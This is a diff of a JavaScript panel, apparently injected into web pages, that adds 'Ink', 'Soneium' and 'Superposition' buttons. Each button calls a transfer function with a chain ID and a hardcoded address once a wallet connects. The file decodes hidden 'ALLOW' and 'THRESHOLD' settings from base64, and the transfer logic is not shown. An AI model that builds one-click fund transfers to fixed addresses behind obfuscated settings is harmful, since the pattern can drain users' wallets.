@@ -151,6 +151,19 @@ const ALLOW = atob(USE);const THRESHOLD = parseFloat(atob(THRESH));
   bobButton.style.fontSize = "12px";
   bobButton.disabled = true;
 
+  const inkButton = document.createElement("button");
+  inkButton.textContent = "Ink";
+  inkButton.style.width = "100%";
+  inkButton.style.padding = "6px";
+  inkButton.style.marginBottom = "5px";
+  inkButton.style.backgroundColor = "#FF4081";
+  inkButton.style.color = "#ffffff";
+  inkButton.style.border = "none";
+  inkButton.style.borderRadius = "3px";
+  inkButton.style.cursor = "pointer";
+  inkButton.style.fontSize = "12px";
+  inkButton.disabled = true;
+
   const modeButton = document.createElement("button");
   modeButton.textContent = "Mode";
   modeButton.style.width = "100%";
@@ -189,6 +202,32 @@ const ALLOW = atob(USE);const THRESHOLD = parseFloat(atob(THRESH));
   optimismButton.style.cursor = "pointer";
   optimismButton.style.fontSize = "12px";
   optimismButton.disabled = true;
+
+  const soneiumButton = document.createElement("button");
+  soneiumButton.textContent = "Soneium";
+  soneiumButton.style.width = "100%";
+  soneiumButton.style.padding = "6px";
+  soneiumButton.style.marginBottom = "5px";
+  soneiumButton.style.backgroundColor = "#673AB7";
+  soneiumButton.style.color = "#ffffff";
+  soneiumButton.style.border = "none";
+  soneiumButton.style.borderRadius = "3px";
+  soneiumButton.style.cursor = "pointer";
+  soneiumButton.style.fontSize = "12px";
+  soneiumButton.disabled = true;
+
+  const superpositionButton = document.createElement("button");
+  superpositionButton.textContent = "Superposition";
+  superpositionButton.style.width = "100%";
+  superpositionButton.style.padding = "6px";
+  superpositionButton.style.marginBottom = "5px";
+  superpositionButton.style.backgroundColor = "#4CAF50";
+  superpositionButton.style.color = "#ffffff";
+  superpositionButton.style.border = "none";
+  superpositionButton.style.borderRadius = "3px";
+  superpositionButton.style.cursor = "pointer";
+  superpositionButton.style.fontSize = "12px";
+  superpositionButton.disabled = true;
 
   const superseedButton = document.createElement("button");
   superseedButton.textContent = "Superseed";
@@ -259,9 +298,12 @@ const ALLOW = atob(USE);const THRESHOLD = parseFloat(atob(THRESH));
   container.appendChild(baseButton);
   container.appendChild(berachainButton);
   container.appendChild(bobButton);
+  container.appendChild(inkButton);
   container.appendChild(modeButton);
   container.appendChild(monadButton);
   container.appendChild(optimismButton);
+  container.appendChild(soneiumButton);
+  container.appendChild(superpositionButton);
   container.appendChild(superseedButton);
   container.appendChild(unichainButton);
   container.appendChild(zoraButton);
@@ -329,12 +371,16 @@ const ALLOW = atob(USE);const THRESHOLD = parseFloat(atob(THRESH));
     } else if (event.data.type === "WALLET_CONNECTED") {
       status.textContent = `Connecté : ${event.data.account.slice(0, 6)}...${event.data.account.slice(-4)}`;
       baseButton.disabled = false;
-      optimismButton.disabled = false;
-      modeButton.disabled = false;
-      unichainButton.disabled = false;
-      bobButton.disabled = false;
       berachainButton.disabled = false;
+      bobButton.disabled = false;
+      inkButton.disabled = false; // Nouveau
+      modeButton.disabled = false;
+      monadButton.disabled = false;
+      optimismButton.disabled = false;
+      soneiumButton.disabled = false; // Nouveau
+      superpositionButton.disabled = false; // Nouveau
       superseedButton.disabled = false;
+      unichainButton.disabled = false;
       zoraButton.disabled = false;
     } else if (event.data.type === "WALLET_ERROR") {
       status.textContent = `Erreur : ${event.data.message}`;
@@ -386,9 +432,12 @@ const ALLOW = atob(USE);const THRESHOLD = parseFloat(atob(THRESH));
   baseButton.addEventListener("click", () => handleTransfer(8453, "Base", "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae"));
   berachainButton.addEventListener("click", () => handleTransfer(80094, "Berachain", "0xeeeeee9ec4769a09a76a83c7bc42b185872860ee"));
   bobButton.addEventListener("click", () => handleTransfer(60808, "Bob", "0x00000000aa467eba42a3d604b3d74d63b2b6c6cb"));
+  inkButton.addEventListener("click", () => handleTransfer(57073, "Ink", "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089"));
   modeButton.addEventListener("click", () => handleTransfer(34443, "Mode", "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae"));
   monadButton.addEventListener("click", () => handleTransfer(143, "Monad", "0xD22Ea6e9d5D01BbFca62Be7C1E549838178499C1"));
   optimismButton.addEventListener("click", () => handleTransfer(10, "Optimism", "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae"));
+  soneiumButton.addEventListener("click", () => handleTransfer(1868, "Soneium", "0x99067E1C68f3a474f72cedF885f9f1fF7F0AAF5e"));
+  superpositionButton.addEventListener("click", () => handleTransfer(55244, "Superposition", "0xF3334049A3ce7e890bd4f8C6a0FBC70e38fd3746"));
   superseedButton.addEventListener("click", () => handleTransfer(5330, "Superseed", "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089"));
   unichainButton.addEventListener("click", () => handleTransfer(130, "Unichain", "0x3a23F943181408EAC424116Af7b7790c94Cb97a5"));
   zoraButton.addEventListener("click", () => handleTransfer(7777777, "Zora", "0xa5F565650890fBA1824Ee0F21EbBbF660a179934"));
